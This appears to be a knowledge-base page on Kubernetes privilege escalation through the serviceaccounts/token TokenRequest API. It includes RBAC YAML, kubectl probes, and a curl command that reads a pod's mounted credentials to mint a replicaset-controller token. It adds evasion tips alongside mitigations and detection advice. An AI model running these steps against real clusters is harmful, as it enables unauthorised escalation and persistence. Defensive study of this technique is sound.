---
title: Privilege Escalation via serviceaccounts/token Permission
description: How create permission on the serviceaccounts/token subresource enables acquiring tokens for more privileged service accounts without pods or Secrets
category: offensive
createdAt: 2026-04-12
impact: >-
  An attacker with create on serviceaccounts/token in any namespace can generate a valid, usable token for any service account in that namespace, including ones bound to powerful cluster roles. No pod needs to exist. No Secret is created. The operation leaves only an audit log entry.
mitigation:
  - Treat create on serviceaccounts/token as a privileged permission equivalent to impersonation. Audit every binding that grants it.
  - Alert on TokenRequest audit events where the requesting identity is not a known controller and the target service account is not the requester's own account.
  - Scope token-requestor roles to a single named service account using resourceNames rather than granting access to all accounts in a namespace.
mitreTechniques:
  - T1528
  - T1550
  - T1078
tools:
  - kubectl
  - curl
references: |
  - [Kubernetes TokenRequest API](https://kubernetes.io/docs/reference/kubernetes-api/authentication-resources/token-request-v1/)
  - [Detecting and Restricting Service Account Token Generation](/topics/detecting-restricting-serviceaccount-token-generation)
  - [Kubernetes RBAC](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
  - [rbac-police (RBAC misconfiguration scanner)](https://github.com/lightspin-tech/rbac-police)
  - [Attacker persistence in Kubernetes using the TokenRequest API](https://securitylabs.datadoghq.com/articles/kubernetes-tokenrequest-api/)
---

## How the TokenRequest API works

The TokenRequest API issues short-lived tokens on demand. The API endpoint is:

```
POST /api/v1/namespaces/<namespace>/serviceaccounts/<name>/token
```

A caller sends a `TokenRequest` specifying how long the token should live and which audiences it should be valid for:

```json
{
  "apiVersion": "authentication.k8s.io/v1",
  "kind": "TokenRequest",
  "spec": {
    "expirationSeconds": 3600,
    "audiences": ["https://kubernetes.default.svc.cluster.local"]
  }
}
```

A caller with `create` on the `serviceaccounts/token` subresource can call this endpoint for any service account the RBAC rule covers, not just its own. The API server has no requirement that the requester and the target be the same identity, which means any over-permissive grant of the subresource becomes an impersonation primitive.

## RBAC permissions required

```yaml
rules:
  - apiGroups: [""]
    resources: ["serviceaccounts/token"]
    verbs: ["create"]
```

This is the minimum needed. The attacker does not need `get` on `serviceaccounts`, `create` on `pods`, or access to `secrets`.

When checking this permission with `kubectl auth can-i`, the slash notation returns a misleading `no`. The `--subresource` flag is required:

```bash
kubectl auth can-i create serviceaccounts/token -n <namespace>
```

```bash
kubectl auth can-i create serviceaccounts --subresource=token -n <namespace>
```

## Identifying privileged targets

Enumeration is not always necessary. Several service accounts exist by default in every Kubernetes cluster and are worth targeting directly without any prior discovery.

The `default` service account is present in every namespace. Operators who do not create dedicated service accounts for their workloads often bind roles directly to `default`, making it a reliable first target.

In `kube-system`, service accounts such as `replicaset-controller`, `deployment-controller`, and `horizontal-pod-autoscaler` are created by the cluster itself and hold broad permissions over their respective resources. These names are fixed across all standard Kubernetes installations and can be targeted without any prior enumeration.

When SA names are not known in advance, listing service accounts in the namespace reveals the full set of candidates:

```bash
kubectl get serviceaccounts -n <namespace> -o name
```

To identify which candidates hold useful permissions without access to rolebindings, probe using impersonation:

```bash
kubectl auth can-i --list -n <namespace> \
  --as=system:serviceaccount:<namespace>:<candidate-sa>
```

> [!NOTE]
> Each probe issues a `SelfSubjectRulesReview` which appears in the audit log, but the response body containing the full permission list is not captured unless the audit policy logs authorization resources at `RequestResponse` level.

## The escalation path

The target in this scenario is `replicaset-controller` in `kube-system`, a service account present in every standard Kubernetes installation. It is bound to the `system:controller:replicaset-controller` ClusterRole, which grants `create` and `delete` on pods across all namespaces:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: system:controller:replicaset-controller
rules:
  - apiGroups: ["apps", "extensions"]
    resources: ["replicasets"]
    verbs: ["get", "list", "update", "watch"]
  - apiGroups: ["apps", "extensions"]
    resources: ["replicasets/status", "replicasets/finalizers"]
    verbs: ["update"]
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["create", "delete", "list", "patch", "watch"]
  - apiGroups: ["", "events.k8s.io"]
    resources: ["events"]
    verbs: ["create", "patch", "update"]
```

An attacker whose workload runs in any namespace only needs a `Role` in `kube-system` granting `create` on `serviceaccounts/token` scoped to `replicaset-controller`:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: token-requestor
  namespace: kube-system
rules:
  - apiGroups: [""]
    resources: ["serviceaccounts/token"]
    verbs: ["create"]
    resourceNames: ["replicaset-controller"]
```

From inside a pod with this permission, the token request goes directly to the API server using the pod's auto-mounted credential:

```bash
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

curl -s -X POST \
  "${APISERVER}/api/v1/namespaces/kube-system/serviceaccounts/replicaset-controller/token" \
  --cacert "${CACERT}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"expirationSeconds":3600}}'
```

The returned token is signed by the API server's `--service-account-signing-key-file`. Its JWT payload contains:

| Claim | Value |
| --- | --- |
| `sub` | `system:serviceaccount:kube-system:replicaset-controller` |
| `iss` | value of `--service-account-issuer` on the API server |
| `aud` | audience from the request spec, defaults to the API server issuer URL |
| `kubernetes.io.namespace` | `kube-system` |
| `kubernetes.io.serviceaccount.name` | `replicaset-controller` |
| `exp` | `now + expirationSeconds` |
| `jti` | unique token ID, recorded in the audit log as `issued-credential-id` |

Verifying the permission difference using impersonation:

```bash
kubectl auth can-i create pods -n default \
  --as=system:serviceaccount:default:default

kubectl auth can-i create pods -n default \
  --as=system:serviceaccount:kube-system:replicaset-controller
```

The retrieved token carries the `replicaset-controller` identity with cluster-wide pod creation and deletion capability.

## Why this is dangerous

The TokenRequest API is designed to replace long-lived auto-mounted tokens. The permission is therefore present in clusters that follow the modern token model. What makes it dangerous is scope: a role that grants `create` on `serviceaccounts/token` without a `resourceNames` restriction allows token generation for every service account in the namespace, not just the requester's own.

The token is ephemeral. After its expiry time there is nothing left in the cluster. The only durable record is in the audit log.

The curl command above does not include a `boundObjectRef` in the request spec. Without it the token is not tied to any pod lifetime and remains valid for the full `expirationSeconds` duration even after the pod that requested it is deleted. An attacker can retrieve the token, delete the attacking pod to remove the immediate evidence, and continue using the token externally until it expires.

The difference is observable by comparing the API server response for each case after the originating pod is deleted:

```bash
# Unbound token — 403 Forbidden (authenticated, token accepted, no list permission)
curl -sk https://<apiserver>/api/v1/namespaces/<namespace>/serviceaccounts \
  -H "Authorization: Bearer <unbound-token>"

# Bound token — 401 Unauthorized (token rejected, bound pod no longer exists)
curl -sk https://<apiserver>/api/v1/namespaces/<namespace>/serviceaccounts \
  -H "Authorization: Bearer <bound-token>"
```

A 403 means the API server accepted the credential and evaluated RBAC. A 401 means it rejected the token before reaching authorization. Once the bound pod is deleted, the bound token is permanently dead regardless of its `exp` claim.

When `--service-account-max-token-expiration` is not set on the API server, there is no ceiling. The API server accepts any value, requesting 99999999 seconds produces a token valid to 2029. Setting the flag caps all issued tokens to the configured maximum regardless of what the caller requests. Requesting a long-lived token before detection means the credential survives rotation of the attacking pod's own service account.
